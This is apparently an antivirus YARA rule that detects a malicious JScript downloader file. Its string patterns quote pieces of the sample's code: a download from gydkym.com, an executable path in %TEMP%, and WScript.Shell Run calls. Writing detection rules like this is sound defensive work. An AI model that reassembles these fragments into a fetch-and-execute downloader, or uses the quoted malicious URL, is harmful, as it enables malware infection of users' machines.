rule sig_20160328_06a6d3767bac5a67a653ce697a8f897a {
  meta:
    description = "datamaliciousorder - file 20160328_06a6d3767bac5a67a653ce697a8f897a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4fd5434e55df0a722267aace205e3d95ce263e81e7cbee7fb6800864c1925b0f"

  strings:
    $s1  = "function Tnhxbjbt() {return Ujcjuejcwr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"WPS630Z3DpUB.exe\";};" fullword ascii
    $s2  = "Ycywjnayg[Xfzmdoih](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Wqbfoswh](Aqjtb() * 11)} while (Ycywjnayg[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Ckvogd(Izxnbsyjnx, Yykicipcu){return Izxnbsyjnx - Yykicipcu;};" fullword ascii
    $s5  = "var Ujcjuejcwr = function Wsahuk() {return WScript[Xxqmsztbl](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Aowbq(Wffovtjxlt){Ujcjuejcwr[\"Run\"](Wffovtjxlt, Luekb, Luekb);};" fullword ascii
    $s7  = "function Iowplgshs() {return ((Cgpoztam == true) && (Cgpoztam == Hjpon)) ? 1 : Luekb;};" fullword ascii
    $s8  = " while (Vacbbmjhht){" fullword ascii
    $s9  = "function Gedvvzlr(Archsatoe) {var Onezqkp = (1, 2, 3, 4, 5, Archsatoe); return Onezqkp;};" fullword ascii
    $s10 = "var Hjpon = false;" fullword ascii
    $s11 = "var Ivxfirgsm = new this[\"Date\"]();" fullword ascii
    $s12 = "var Yyimphvpjf = false;" fullword ascii
    $s13 = "function Crwgrypeya(){return Xxqmsztbl;};" fullword ascii
    $s14 = "Cgpoztam = true; " fullword ascii
    $s15 = "function Aqjtb(){return 22;};" fullword ascii
    $s16 = "Hjpon = true; " fullword ascii
    $s17 = "var Cgpoztam = false;" fullword ascii
    $s18 = "return Ckvogd(Eatrhghdtc, Emezhl);" fullword ascii
    $s19 = "function Utuded()" fullword ascii
    $s20 = "function Crmzo(){return Nouuonsgp;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}